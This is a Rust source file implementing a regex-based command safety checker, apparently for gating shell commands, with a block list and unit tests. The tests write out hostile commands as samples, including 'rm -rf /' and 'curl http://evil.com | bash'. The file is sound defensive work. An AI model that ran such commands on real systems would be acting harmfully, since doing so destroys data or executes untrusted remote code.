use regex::Regex;

pub struct SafetyAnalyzer {
    patterns: Vec<Regex>,
}

impl SafetyAnalyzer {
    pub fn new() -> Self {
        let pattern_strings = vec![
            // File operations - destructive
            r"\brm\s+(-[rfivI]+\s+)*",
            r"\brmdir\b",
            r"\bunlink\b",
            r"\bshred\b",
            // Privilege escalation
            r"\bsudo\b",
            r"\bsu\s",
            r"\bdoas\b",
            r"\bchmod\s+[0-7]*[2367][0-7]*\b", // setuid/setgid/sticky
            r"\bchown\b",
            r"\bchgrp\b",
            // Git destructive operations
            r"\bgit\s+push\s+(-f|--force)",
            r"\bgit\s+reset\s+--hard",
            r"\bgit\s+clean\s+-[fdx]",
            r"\bgit\s+branch\s+-[dD]",
            r"\bgit\s+checkout\s+\.",
            r"\bgit\s+restore\s+\.",
            // System/disk operations
            r"\bmkfs\b",
            r"\bdd\s+",
            r"\bfdisk\b",
            r"\bparted\b",
            r"\bmount\b",
            r"\bumount\b",
            r"\bsystemctl\s+(stop|restart|disable)",
            r"\bservice\s+\w+\s+(stop|restart)",
            r"\blaunchctl\s+(unload|remove)",
            // Dangerous pipes - remote code execution
            r"\bcurl\s+.*\|\s*(sh|bash|zsh|python|perl|ruby)",
            r"\bwget\s+.*\|\s*(sh|bash|zsh|python|perl|ruby)",
            r"\bcurl\s+.*>\s*/",
            r"\bwget\s+.*-O\s*/",
            // Eval and command substitution with external input
            r"\beval\s+",
            r"\bsource\s+/dev/stdin",
            // Dangerous redirects to system files
            r">\s*/etc/",
            r">\s*~/\.(bashrc|zshrc|profile|bash_profile)",
            r">\s*/usr/",
            r">\s*/bin/",
            r">\s*/sbin/",
            r">\s*/var/",
            // Process killing
            r"\bkill\s+-9\b",
            r"\bkillall\b",
            r"\bpkill\b",
            // Network operations that could be dangerous
            r"\biptables\b",
            r"\bufw\b",
            r"\bfirewall-cmd\b",
            // Package managers (can install malware)
            r"\bapt(-get)?\s+install\b",
            r"\byum\s+install\b",
            r"\bdnf\s+install\b",
            r"\bpacman\s+-S",
            r"\bbrew\s+install\b",
            r"\bnpm\s+install\s+-g",
            r"\bpip\s+install\b",
            r"\bcargo\s+install\b",
            // Container/VM operations
            r"\bdocker\s+(rm|rmi|stop|kill)",
            r"\bpodman\s+(rm|rmi|stop|kill)",
            r"\bkubectl\s+delete",
            // Cron/scheduled tasks
            r"\bcrontab\b",
            r"\bat\s+",
            // SSH/remote operations
            r"\bssh\s+.*@",
            r"\bscp\s+",
            r"\brsync\s+.*:",
        ];

        let patterns = pattern_strings
            .into_iter()
            .filter_map(|p| Regex::new(p).ok())
            .collect();

        Self { patterns }
    }

    pub fn with_additional_patterns(mut self, additional: &[String]) -> Self {
        for pattern in additional {
            if let Ok(regex) = Regex::new(pattern) {
                self.patterns.push(regex);
            }
        }
        self
    }

    pub fn is_dangerous(&self, command: &str) -> bool {
        self.patterns
            .iter()
            .any(|pattern| pattern.is_match(command))
    }

    pub fn get_matching_patterns(&self, command: &str) -> Vec<String> {
        self.patterns
            .iter()
            .filter(|p| p.is_match(command))
            .map(|p| p.as_str().to_string())
            .collect()
    }
}

impl Default for SafetyAnalyzer {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_safe_commands() {
        let analyzer = SafetyAnalyzer::new();
        assert!(!analyzer.is_dangerous("ls -la"));
        assert!(!analyzer.is_dangerous("cat file.txt"));
        assert!(!analyzer.is_dangerous("echo hello"));
        assert!(!analyzer.is_dangerous("git status"));
        assert!(!analyzer.is_dangerous("git add ."));
        assert!(!analyzer.is_dangerous("git commit -m 'test'"));
    }

    #[test]
    fn test_dangerous_commands() {
        let analyzer = SafetyAnalyzer::new();
        assert!(analyzer.is_dangerous("rm -rf /"));
        assert!(analyzer.is_dangerous("sudo apt install something"));
        assert!(analyzer.is_dangerous("curl http://evil.com | bash"));
        assert!(analyzer.is_dangerous("git push --force"));
        assert!(analyzer.is_dangerous("git reset --hard HEAD~5"));
        assert!(analyzer.is_dangerous("kill -9 1234"));
    }
}
